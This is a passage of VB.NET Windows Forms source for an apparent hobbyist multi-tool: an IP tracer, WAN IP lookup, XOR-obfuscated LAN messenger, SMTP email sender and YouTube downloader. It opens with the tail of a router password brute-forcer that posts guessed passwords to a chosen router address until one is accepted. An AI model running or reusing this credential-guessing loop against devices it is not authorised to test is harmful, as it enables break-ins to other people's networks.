            scorrimento = 0
            Exit Sub
        End If

        ' <+++ Fine pezzo di codice usato in più +++>

        ' Inizio trasferimento della password al router :

        Dim richiesta As WebRequest = WebRequest.Create(indirizzo_ip)

        richiesta.Method = "POST" '  

        Dim codifica_dati As Byte() = Encoding.UTF8.GetBytes("")

        richiesta.ContentType = "application/x-www-form-urlencoded"

        richiesta.Credentials = New NetworkCredential(nome_utente, password_da_mandare)

        richiesta.ContentLength = codifica_dati.Length

            Dim stream_di_dati As Stream = richiesta.GetRequestStream()

            stream_di_dati.Write(codifica_dati, 0, codifica_dati.Length)

            stream_di_dati.Close()
        
        Try
            Dim risposta As WebResponse = richiesta.GetResponse()

            stream_di_dati = risposta.GetResponseStream()

            Dim lettore_dati As New StreamReader(stream_di_dati)

            Dim risultato_risposta As String = lettore_dati.ReadToEnd()

            lettore_dati.Close()

            stream_di_dati.Close()

            risposta.Close()

            TextBox3.Text = password_da_mandare

            TimerB1.Stop()
            TimerB2.Stop()

            Status_RPC.Top = 410
            Status_RPC.Left = 125

            Button1.Enabled = False

            Me.WindowState = FormWindowState.Normal
            Status_RPC.Text = "Password Found : " & password_da_mandare & " - " & " Elapsed Time : " & Hours_lbl.Text & " : " & Minutes_lbl.Text & " : " & Seconds_lbl.Text
            Button1.Enabled = True
            TimerB4.Stop()
            scorrimento = 0
            Exit Sub

        Catch errore As Exception

        End Try

        ' Fine trasferimento della password al router :

        ' <+++ Usato altrimenti l'ultimo carattere non verra usato .

        If password(lung_pass) = temp_password(lung_temp_pass) Then
            password(lung_pass) = "fine"
        Else
            'aggiunta :
            pos = Array.IndexOf(temp_password, password(lung_pass))
            ' fine aggiunta .
            password(lung_pass) = temp_password(pos + 1)
        End If

        ' +++>

        ' Inizio Azzeramento delle variabili .

        avanza = 0
        risultato = 0
        password_da_mandare = ""
        crea_password = 0

        ' Fine Azzeramento delle variabili . 

    End Sub

    Private Sub Button3_Click_2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click

        Dim percorso As String

        percorso = Application.ExecutablePath

        Process.Start(percorso) ' apri questo programma che si trova in .......

        End ' fine programma 


        scorrimento = 0
        Button3.Enabled = False

        While azzera_password <= lung_pass

            password(azzera_password) = ""
            azzera_password += 1

        End While

        azzera_password = 0
        lung_temp_pass = temp_password.Length
        While azzera_password <= lung_temp_pass
            ReDim temp_password(azzera_password)
            temp_password(azzera_password) = ""
            azzera_password += 1

        End While

        azzera_password = 0

        temp_password(0) = ""

        TimerB1.Stop()
        TimerB2.Stop()
        TimerB4.Stop()
        ListBox1.Items.Clear()

        Button1.Enabled = True

        conta = lung_pass
        avanza = 0
        risultato = 0
        avanza_piu_carattere = 0
        completo = 0
        crea_password = 0
        pause = 0
        sensore_reset = 0

        avanza = 0
        risultato = 0
        password_da_mandare = ""
        crea_password = 0

        lung_scelta_corrente = 0
        avanz_resettabile = 0
        avanz_totale = 0

        nome_utente = ""
        indirizzo_ip = ""
        resetta = 0
        pos = 0

        TextBox3.Text = ""
        TextBox4.Text = ""
        lung_testo = 0

        Hours_lbl.Text = "00"
        Minutes_lbl.Text = "00"
        Seconds_lbl.Text = "00"

        tempo = "0"
        secondi = "0"
        minuti = "0"
        ore = "0"

        'Array.Clear(password, 0, password.Length)
        ' Array.Clear(temp_password, 0, temp_password.Length)

        CheckBox1.Enabled = True
        CheckBox2.Enabled = True
        CheckBox3.Enabled = True
        CheckBox4.Enabled = True
        CheckBox5.Enabled = True
        CheckBox6.Enabled = True

        CheckBox1.Checked = False
        CheckBox2.Checked = False
        CheckBox3.Checked = False
        CheckBox4.Checked = False
        CheckBox5.Checked = False
        CheckBox6.Checked = False

        Button2.Text = "Pause"

        Status_RPC.Top = 410
        Status_RPC.Left = 450

        Thread.Sleep(30)

        Button3.Enabled = True

        Status_RPC.Text = "Reset completed"

        TimerB3.Start()

    End Sub

    Private Sub CheckBox1_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox1.CheckedChanged

        If CheckBox1.Checked = True Then

            CheckBox2.Enabled = False
            CheckBox3.Enabled = False
            CheckBox4.Enabled = False
            CheckBox5.Enabled = False
            CheckBox6.Enabled = False

        Else

            CheckBox2.Enabled = True
            CheckBox3.Enabled = True
            CheckBox4.Enabled = True
            CheckBox5.Enabled = True
            CheckBox6.Enabled = True

        End If


    End Sub

    Private Sub Timer2_Tick_diff(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerB2.Tick

        secondi += 1

        If secondi = 60 Then

            secondi = 0

            If minuti = 59 Then

                minuti = 0
                ore += 1

            Else

                minuti += 1

            End If

        End If

        If ore <= 9 Then

            Hours_lbl.Text = "0" & ore

        Else

            Hours_lbl.Text = ore

        End If

        If minuti <= 9 Then

            Minutes_lbl.Text = "0" & minuti

        Else

            Minutes_lbl.Text = minuti

        End If

        If secondi <= 9 Then

            Seconds_lbl.Text = "0" & secondi

        Else

            Seconds_lbl.Text = secondi

        End If
    End Sub

    Private Sub Button2_Click_2(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        If pause = 0 Then
            Button2.Text = "Continue"
            Status_RPC.Text = ""
            TimerB1.Stop()
            TimerB2.Stop()
            Button1.Enabled = True
            pause = 1
        Else
            If sensore_reset = 1 Then
            Else
                TimerB1.Start()
                TimerB2.Start()
            End If
            pause = 0
            Button2.Text = "Pause"
            Status_RPC.Text = ""
            Button1.Enabled = False
        End If
    End Sub
    Private Sub CheckBox6_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox6.CheckedChanged
        If CheckBox6.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox2.Enabled = False
            CheckBox3.Enabled = False
            CheckBox4.Enabled = False
            CheckBox5.Enabled = False
            TextBox4.Enabled = True
        Else
            CheckBox1.Enabled = True
            CheckBox2.Enabled = True
            CheckBox3.Enabled = True
            CheckBox4.Enabled = True
            CheckBox5.Enabled = True
            TextBox4.Enabled = False
            TextBox4.Enabled = False
        End If
    End Sub
    Private Sub CheckBox3_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox6.Enabled = False
        Else
            CheckBox1.Enabled = True
            CheckBox6.Enabled = True
        End If
    End Sub
    Private Sub CheckBox5_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox5.CheckedChanged
        If CheckBox5.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox6.Enabled = False
        Else
            CheckBox1.Enabled = True
            CheckBox6.Enabled = True
        End If
    End Sub
    Private Sub CheckBox4_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox4.CheckedChanged
        If CheckBox4.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox6.Enabled = False
        Else
            CheckBox1.Enabled = True
            CheckBox6.Enabled = True
        End If
    End Sub
    Private Sub CheckBox2_CheckedChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles CheckBox2.CheckedChanged
        If CheckBox2.Checked = True Then
            CheckBox1.Enabled = False
            CheckBox6.Enabled = False
        Else
            CheckBox1.Enabled = True
            CheckBox6.Enabled = True
        End If
    End Sub
    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerB3.Tick
        If resetta = 300 Then
            Status_RPC.Text = ""
            TimerB3.Stop()
            resetta = 0
            Exit Sub
        End If
        resetta += 1
    End Sub
    Private Sub ListBox1_MouseHover(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListBox1.MouseHover
        scorrimento = 0
        TimerB4.Stop()
    End Sub
    Private Sub ListBox1_MouseLeave(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListBox1.MouseLeave
        scorrimento = 1
        TimerB4.Start()
    End Sub
    Private Sub ListBox1_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles ListBox1.MouseMove
        scorrimento = 0
        TimerB4.Stop()
    End Sub
    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerB4.Tick
        If scorrimento = 0 Then
            TimerB4.Stop()
        Else
            ListBox1.TopIndex = ListBox1.Items.Count - 1
        End If
    End Sub
    '--------------------------------------------------------------
    'Code for IP Tracer - Program(C)
    '----------------------------------
    Private Sub Button7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button7.Click
        Try
            If TextBox7.Text = ("") Then
                MsgBox("Please Enter A Website !", MsgBoxStyle.Exclamation, "IP Tracer")
                TextBox6.Clear()
                Exit Sub
            End If
            If TextBox7.Text.StartsWith("http") Or TextBox7.Text.StartsWith("https") Then
                MsgBox("Please Enter A Website Without (http) or (https).", MsgBoxStyle.Exclamation, "IP Tracer")
                Exit Sub
            End If
            Dim host As IPHostEntry
            Dim hostname As String
            hostname = TextBox7.Text
            host = Dns.GetHostEntry(hostname)
            For Each ip As IPAddress In host.AddressList
                If ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork Then
                    lbl7.Text = ip.ToString
                End If
                TextBox6.Text = ip.ToString
                TextBox6.ForeColor = Color.Blue
            Next
            Dim domain As String = TextBox7.Text
            Dim ip_Addresses As IPAddress() = Dns.GetHostAddresses(domain)
            Dim ips As String = String.Empty
            For Each ipAddress As IPAddress In ip_Addresses
                ips += "( " + ipAddress.ToString() + " )" + "  "
            Next
            TextBox8.Text = ips
            TextBox8.ForeColor = Color.Red
        Catch ex As SocketException
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
    End Sub
    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        TextBox7.Clear()
        TextBox6.Clear()
        TextBox8.Clear()
        TextBox7.Focus()
    End Sub
    Private Sub TimerC1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerC1.Tick
        If mark.ForeColor = Color.Black Then
            mark.ForeColor = Color.Green
        ElseIf mark.ForeColor = Color.Green Then
            mark.ForeColor = Color.Red
        ElseIf mark.ForeColor = Color.Red Then
            mark.ForeColor = Color.Blue
        ElseIf mark.ForeColor = Color.Blue Then
            mark.ForeColor = Color.Black
        End If
    End Sub
    '-----------------------------------------------------------------
    'Code for IP Tracker - Program(D)
    '-----------------------------------
    Private Sub Button12_Click(sender As Object, e As EventArgs) Handles Button12.Click
        If stat.Text = "Disconnected" Then
            MsgBox("You are disconnected from the internet , connect to the internet and try again.", MsgBoxStyle.Critical, "Error...")
            Exit Sub
        Else
            WebBrowser2.Navigate("https://tools.feron.it/php/ip.php")
            WANIPTimer.Start()
        End If
    End Sub

    Private Sub WANIPTimer_Tick(sender As Object, e As EventArgs) Handles WANIPTimer.Tick
        WANIP.Text = WebBrowser2.DocumentText.ToString
        WANIPTimer.Stop()
    End Sub

    Private Sub Button5_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button5.Click
        Clipboard.SetText(WANIP.Text)
    End Sub

    Private Sub WANIP_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles WANIP.TextChanged
        If WANIP.Text = "" Then
            Button5.Enabled = False
            MsgBox("Unable to get WAN IP Address.", MsgBoxStyle.Critical, "Error")
        Else
            Button5.Enabled = True
        End If
    End Sub
    '------------------------------------------------------------
    'Code for LAN Messenger - Program(E)
    '--------------------------------------
    Dim listener As New TcpListener(44444)
    Dim tcpclnt As TcpClient
    Dim message As String = ""
    Dim tts
    'Code for START-UP of this program is found above
    Private Sub send_btn_Click(ByVal sender As Object, ByVal e As EventArgs) Handles send_btn.Click
        msg_box.Text = nameTxtbox.Text + " says : " + msg_box.Text
        msg_box.Text = MessageTransposition(msg_box.Text, False)
        TimerE2.Start()
    End Sub
    Private Sub Button6_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button6.Click
        TreeView1.Nodes.Clear()
        Dim childEntry As DirectoryEntry
        Dim ParentEntry As New DirectoryEntry()
        Me.Cursor = Cursors.WaitCursor
        Try
            ParentEntry.Path = "WinNT:"
            For Each childEntry In ParentEntry.Children
                Dim newNode As New TreeNode(childEntry.Name)
                Select Case childEntry.SchemaClassName
                    Case "Domain"
                        Dim ParentDomain As New TreeNode(childEntry.Name)
                        TreeView1.Nodes.AddRange(New TreeNode() {ParentDomain})

                        Dim SubChildEntry As DirectoryEntry
                        Dim SubParentEntry As New DirectoryEntry()
                        SubParentEntry.Path = "WinNT://" & childEntry.Name
                        For Each SubChildEntry In SubParentEntry.Children
                            Dim newNode1 As New TreeNode(SubChildEntry.Name)
                            Select Case SubChildEntry.SchemaClassName
                                Case "Computer"
                                    ParentDomain.Nodes.Add(newNode1)
                            End Select
                        Next
                End Select
            Next
            Me.Cursor = Cursors.Default
        Catch Excep As Exception
            MsgBox("Error While Reading Directories")
            Me.Cursor = Cursors.Default
        Finally
            ParentEntry = Nothing
        End Try
        TimerE1.Start()
    End Sub
    Private Sub Listen_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TimerE1.Tick
        listener.Start()
        If listener.Pending = True Then
            message = ""
            tcpclnt = listener.AcceptTcpClient
            Dim reader As New StreamReader(tcpclnt.GetStream())
            While reader.Peek > -1
                message = message + Convert.ToChar(reader.Read()).ToString
            End While
            Me.Focus()
            message = MessageTransposition(message, False)
            inbox.Text = inbox.Text + message + vbCrLf
            tts = CreateObject("sapi.spvoice")
            tts.speak(message)
        End If
    End Sub
    Private Sub Form1_FormClosingForLANMESSENGER(ByVal sender As Object, ByVal e As FormClosingEventArgs) Handles MyBase.FormClosing
        listener.Stop()
    End Sub
    Private Sub TreeView1_AfterSelect(ByVal sender As Object, ByVal e As TreeViewEventArgs) Handles TreeView1.AfterSelect
        If TreeView1.SelectedNode.Text = "WORKGROUP" Then
            Exit Sub
        Else
            'This is the code for getting IP Address
            Dim host As IPHostEntry
            Dim hostname As String
            hostname = TreeView1.SelectedNode.Text
            host = Dns.GetHostEntry(hostname)
            For Each ip As IPAddress In host.AddressList
                If ip.AddressFamily = System.Net.Sockets.AddressFamily.InterNetwork Then
                    ip_addr.Text = ip.ToString
                End If
            Next
        End If
    End Sub
    Private Sub RichTextBox1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles msg_box.KeyDown
        If e.KeyCode = Keys.Insert Then
            msg_box.Text = nameTxtbox.Text + " says " + msg_box.Text
            msg_box.Text = MessageTransposition(msg_box.Text, False)
            TimerE2.Start()
        End If
    End Sub

    Dim ChkXOR As New CheckBox
    Private Function MessageTransposition(ByVal StrDataIn As String, ByVal ED As Boolean) As String

        '>>> if needed xor, use this code
        Dim XORCode As Integer
        XORCode = 213

        Dim rowind As Integer     'index row
        Dim colind As Integer     'index column

        rowind = 1
        colind = 1
        '>>> create the array
        Dim DataArray(rowind, colind) As String
        Dim i, j As Integer
        Dim r, c As Integer
        Dim output As String
        output = ""
        i = 1
        '>>> loop to total length
        While i <= StrDataIn.Length

            '>>> clear the array
            For r = 0 To rowind
                For c = 0 To colind
                    DataArray(r, c) = Chr(1)
                Next
            Next

            '>>> check the loop last postion
            Dim LastPos As Integer
            If i + (rowind * colind) - 1 <= StrDataIn.Length Then
                LastPos = i + (rowind * colind) - 1
            Else
                LastPos = StrDataIn.Length
            End If

            '>>> store strdata in into array character by character
            '>>> initial the array indexer
            r = 0
            c = 0
            For j = i To LastPos

                ChkXOR.Checked = True
                '>>> check if need to XOR the character
                If ChkXOR.Checked = True Then
                    Dim TempChar As String
                    TempChar = Mid(StrDataIn, j, 1)
                    DataArray(r, c) = Chr(Asc(TempChar) Xor XORCode)
                Else
                    DataArray(r, c) = Mid(StrDataIn, j, 1)
                End If

                c = c + 1


                '>>> reset the array indexer
                If r > rowind - 1 Then
                    r = 0
                    c = 0
                End If
                If c > colind - 1 Then
                    c = 0
                    r = r + 1
                End If
            Next

            '>>> add array value to string coulumn nad row wise
            If ED = True Then
                For c = 0 To colind - 1
                    For r = 0 To rowind - 1
                        output = output & DataArray(r, c)
                    Next
                Next
            Else
                '>>> decrypt logics
                Dim StrTemp As String
                StrTemp = ""
                Dim p, p1 As Integer
                p = 1
                p1 = 1
                For r = 0 To rowind - 1
                    For c = 0 To colind - 1
                        StrTemp = StrTemp & DataArray(r, c)
                    Next
                Next

                While p <= StrTemp.Length
                    '>>> replace array filling character
                    '>>> check if it is xor 
                    ChkXOR.Checked = True
                    If ChkXOR.Checked = True Then
                        output = output & Replace(Mid(StrTemp, p1, 1), Chr(Asc(Chr(1)) Xor XORCode), "")
                    Else
                        output = output & Replace(Mid(StrTemp, p1, 1), Chr(1), "")
                    End If


                    p = p + 1

                    '>>> increment position by row
                    p1 = p1 + rowind
                    If p1 > StrTemp.Length Then
                        p1 = p1 - StrTemp.Length + 1
                    End If
                End While
            End If
            i = i + rowind * colind
        End While

        MessageTransposition = output


    End Function
    Private Sub TimerE2_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TimerE2.Tick
        TimerE2.Stop()
        tcpclnt = New TcpClient(ip_addr.Text, 44444)
        Dim writer As New StreamWriter(tcpclnt.GetStream())
        writer.Write(msg_box.Text)
        writer.Flush()
        msg_box.Text = ""
    End Sub
    Private Sub Button8_Click(sender As Object, e As EventArgs) Handles Button8.Click
        inbox.Clear()
    End Sub
    '-------------------------------------------------------------------
    'Code for Email Sender - Program(F)
    '------------------------------------
    Private Sub btn1_snd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btn1_snd.Click
        If lbl7.Text = "127.0.0.1" Then
            MsgBox("You are not connected to the internet.", MsgBoxStyle.Exclamation, "Warning...")
            Exit Sub
        End If
        Try
            Dim mail As New System.Net.Mail.MailMessage
            Dim SmtpServer As New SmtpClient
            SmtpServer.Timeout = 999999999
            SmtpServer.Credentials = New Net.NetworkCredential(from.Text + from_pt2.Text, emailPass.Text)
            SmtpServer.Port = 587
            SmtpServer.Host = pvdr.SelectedItem.ToString
            If pvdr.SelectedItem = "smtp.mail.yahoo.com" Then
                SmtpServer.EnableSsl = False
            Else
                SmtpServer.EnableSsl = True
            End If
            mail.To.Add(To_txtbox.Text)
            mail.From = New System.Net.Mail.MailAddress(from.Text + from_pt2.Text)
            mail.Subject = subjectTxtbox.Text
            mail.Body = "<b><font color=black>" + msg_txtBox_email.Text
            mail.IsBodyHtml = True
            If AttachTXTBOX.Text = "--No Attachment--" Then
                SmtpServer.Send(mail)
            Else
                mail.Attachments.Add(New Net.Mail.Attachment(OpenFileDialog1.FileName.ToString))
                SmtpServer.Send(mail)
            End If
            MsgBox("E-mail was sucsessfully sent!", MsgBoxStyle.Information)
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, "Error")
        End Try
        Return
    End Sub
    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles from.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub TextBox2_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles emailPass.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub TextBox3_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles To_txtbox.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub TextBox4_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles msg_txtBox_email.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub ComboBox1_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles pvdr.SelectedIndexChanged
        If pvdr.SelectedItem = "smtp.gmail.com" Then
            from_pt2.Text = "@gmail.com"
            outlook.Hide()
            gmx.Hide()
            L7.Hide()
        End If
        If pvdr.SelectedItem = "smtp.live.com" Then
            outlook.Show()
            gmx.Hide()
            from_pt2.Clear()
            L7.Show()
            from_pt2.Text = "Select Provider"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Hotmail" Then
            from_pt2.Text = "@hotmail.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Live" Then
            from_pt2.Text = "@live.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Outlook" Then
            from_pt2.Text = "@outlook.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Msn" Then
            from_pt2.Text = "@msn.com"
        End If
        If pvdr.SelectedItem = "smtp.aol.com" Then
            from_pt2.Text = "@aol.com"
            outlook.Hide()
            gmx.Hide()
            L7.Hide()
        End If
        If pvdr.SelectedItem = "smtp.mail.yahoo.com" Then
            outlook.Hide()
            gmx.Hide()
            L7.Hide()
            from_pt2.Text = "@yahoo.com"
        End If
        If pvdr.SelectedItem = "smtp.gmx.com" Then
            from_pt2.Clear()
            gmx.Hide()
            gmx.Show()
            L7.Show()
            from_pt2.Text = "Select Provider"
        End If
        If pvdr.SelectedItem = "smtp.gmx.com" And gmx.Text = "gmx.com" Then
            from_pt2.Text = "@gmx.com"
        End If
        If pvdr.SelectedItem = "smtp.gmx.com" And gmx.Text = "gmx.us" Then
            from_pt2.Text = "@gmx.us"
        End If
        If pvdr.SelectedItem = "smtp.mail.com" Then
            from_pt2.Text = "@mail.com"
            outlook.Hide()
            gmx.Hide()
            L7.Hide()
        End If
    End Sub
    Private Sub outlook_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles outlook.SelectedIndexChanged
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Hotmail" Then
            from_pt2.Text = "@hotmail.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Live" Then
            from_pt2.Text = "@live.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Outlook" Then
            from_pt2.Text = "@outlook.com"
        End If
        If pvdr.SelectedItem = "smtp.live.com" And outlook.Text = "Msn" Then
            from_pt2.Text = "@msn.com"
        End If
        If outlook.Text = "Hotmail" Then
            from_pt2.Text = "@hotmail.com"
        End If
        If outlook.Text = "Live" Then
            from_pt2.Text = "@live.com"
        End If
        If outlook.Text = "Msn" Then
            from_pt2.Text = "@msn.com"
        End If
        If outlook.Text = "Outlook" Then
            from_pt2.Text = "@outlook.com"
        End If
    End Sub
    Private Sub TextBox5_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles from_pt2.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub TextBox6_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles subjectTxtbox.TextChanged
        If from.Text = "" Or emailPass.Text = "" Or To_txtbox.Text = "" Or msg_txtBox_email.Text = "" Or from_pt2.Text = "" Or subjectTxtbox.Text = "" Or pvdr.Text = "" Then
            btn1_snd.Enabled = False
        Else
            btn1_snd.Enabled = True
        End If
    End Sub
    Private Sub LinkLabel1_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkL1.LinkClicked
        Help.Show()
    End Sub
    Private Sub LinkLabel2_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkL2.LinkClicked
        OpenFileDialog1.ShowDialog()
    End Sub
    Private Sub OpenFileDialog1_FileOk(ByVal sender As System.Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles OpenFileDialog1.FileOk
        AttachTXTBOX.Text = OpenFileDialog1.FileName.ToString
    End Sub
    Private Sub LinkLabel3_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkL3.LinkClicked
        AttachTXTBOX.Text = "--No Attachment--"
    End Sub
    Private Sub ComboBox3_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles gmx.SelectedIndexChanged
        If pvdr.SelectedItem = "smtp.gmx.com" And gmx.Text = "gmx.com" Then
            from_pt2.Text = "@gmx.com"
        End If
        If pvdr.SelectedItem = "smtp.gmx.com" And gmx.Text = "gmx.us" Then
            from_pt2.Text = "@gmx.us"
        End If
        If gmx.Text = "gmx.com" Then
            from_pt2.Text = "@gmx.com"
        End If
        If gmx.Text = "gmx.us" Then
            from_pt2.Text = "@gmx.us"
        End If
    End Sub
    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles svd_emails.Click
        _Settings.Show()
    End Sub
    Function IsConnected() As Boolean
        Try
            My.Computer.Network.Ping("www.google.com.eg")
            Return True
        Catch ex As PingException
            Return False
        End Try
    End Function
    Private Sub Timer_F1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TimerF1.Tick
        If My.Computer.Network.IsAvailable = False Then
            TimerF1.Stop()
            L10.Text = "Disconnected"
        Else
            If IsConnected() = True Then
                L10.Text = "Connected"
                TimerF1.Stop()
            ElseIf IsConnected() = False Then
                L10.Text = "Disconnected"
                TimerF1.Stop()
            End If
        End If
    End Sub
    Private Sub LinkLabel4_LinkClicked(ByVal sender As System.Object, ByVal e As System.Windows.Forms.LinkLabelLinkClickedEventArgs) Handles LinkL4.LinkClicked
        MsgBox("This program is coded by : David Sanculane . For further infromation visit : http://www.davidsoft.webs.com", MsgBoxStyle.Information, "About E-mail Sender...")
    End Sub
    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles checker.Click
        If from.Text = "" Or emailPass.Text = "" Or from_pt2.Text = "" Or pvdr.Text = "" Then
            MsgBox("Enter all the information to check.", MsgBoxStyle.Exclamation)
        Else
            Demo.Show()
        End If
    End Sub
    '------------------------------------------------------------------------------------
    'Codes for YouTube Downloader - Program(H)
    '-------------------------------------------
    'Settings For Youtube Downloader
    Public Sub New()
        Me.InitializeComponent()
        MyBase.SuspendLayout()
        Me.Font = New Font("Tahoma", 8.25!)
        If (Me.Font.Name <> "Tahoma") Then
            Me.Font = New Font("Arial", 8.25!)
        End If
        MyBase.AutoScaleMode = AutoScaleMode.Font
        MyBase.AutoScaleDimensions = New SizeF(6.0!, 13.0!)
        MyBase.ResumeLayout(False)
        'Me.Text = (Application.ProductName & "  [v" & Application.ProductVersion.Substring(0, 3) & "]")
        Me.lblResult.Text = ""
        If (Clipboard.GetText.Contains("youtube.com/") OrElse Clipboard.GetText.Contains("youtu.be/")) Then
            Me.txtUrl.Text = Clipboard.GetText.Trim
        End If
    End Sub
    'Codes for Download Button
    Private Sub btnAll_Click(ByVal sender As Object, ByVal e As EventArgs) Handles btnAll.Click
        ghostProgressbar1.Show()
        ghostProgressbar1.BringToFront()
        lblprogress.Show()
        lblprogress.BringToFront()
        Form1.filePath = Nothing
        Me.lockGui()
        Me.lblResult.Text = "Check video url.."
        Me.lblResult.Refresh()
        Dim youTubeVideoUrl As String = Me.txtUrl.Text.Trim
        If youTubeVideoUrl.StartsWith("https://") Then
            youTubeVideoUrl = ("http://" & youTubeVideoUrl.Substring(8))
        ElseIf Not youTubeVideoUrl.StartsWith("http://") Then
            youTubeVideoUrl = ("http://" & youTubeVideoUrl)
        End If
        youTubeVideoUrl = youTubeVideoUrl.Replace("youtu.be/", "youtube.com/watch?v=").Replace("www.youtube.com", "youtube.com")
        If youTubeVideoUrl.StartsWith("http://youtube.com/v/") Then
            youTubeVideoUrl = youTubeVideoUrl.Replace("youtube.com/v/", "youtube.com/watch?v=")
        ElseIf youTubeVideoUrl.StartsWith("http://youtube.com/watch#") Then
            youTubeVideoUrl = youTubeVideoUrl.Replace("youtube.com/watch#", "youtube.com/watch?")
        End If
        If Not youTubeVideoUrl.StartsWith("http://youtube.com/watch") Then
            MsgBox("Invalid YouTube URL!", MsgBoxStyle.Critical, "Error...")
            Me.unlockGui()
            ghostProgressbar1.SendToBack()
            lblprogress.Hide()
            lblsize.Hide()
        Else
            Dim uriString As String = Nothing
            Try
                Me.yts = YouTubeService.Create(youTubeVideoUrl)
                Me.title = yts.VideoTitle
                If ((Me._audio AndAlso (Me.yts.availableVideoFormat.Capacity = 0)) OrElse (Not Me._audio AndAlso (Me.yts.availableVideoFormat.Capacity = 0))) Then
                    Throw New Exception("No Videos Found!")
                    ghostProgressbar1.SendToBack()
                    lblprogress.Hide()
                    lblsize.Hide()
                End If
            Catch exception As Exception
                MsgBox(exception.Message, MsgBoxStyle.Critical, "Error...")
                Me.unlockGui()
                ghostProgressbar1.SendToBack()
                lblprogress.Hide()
                lblsize.Hide()
                Return
            End Try
            Dim index As Integer = 0
            Form1.filePath = Me.chooseFormat(index)
            If (index = 0) Then
                Me.unlockGui()
            Else
                If Me._audio Then
                    Try
                        File.Create(Form1.filePath).Close()
                    Catch exception2 As Exception
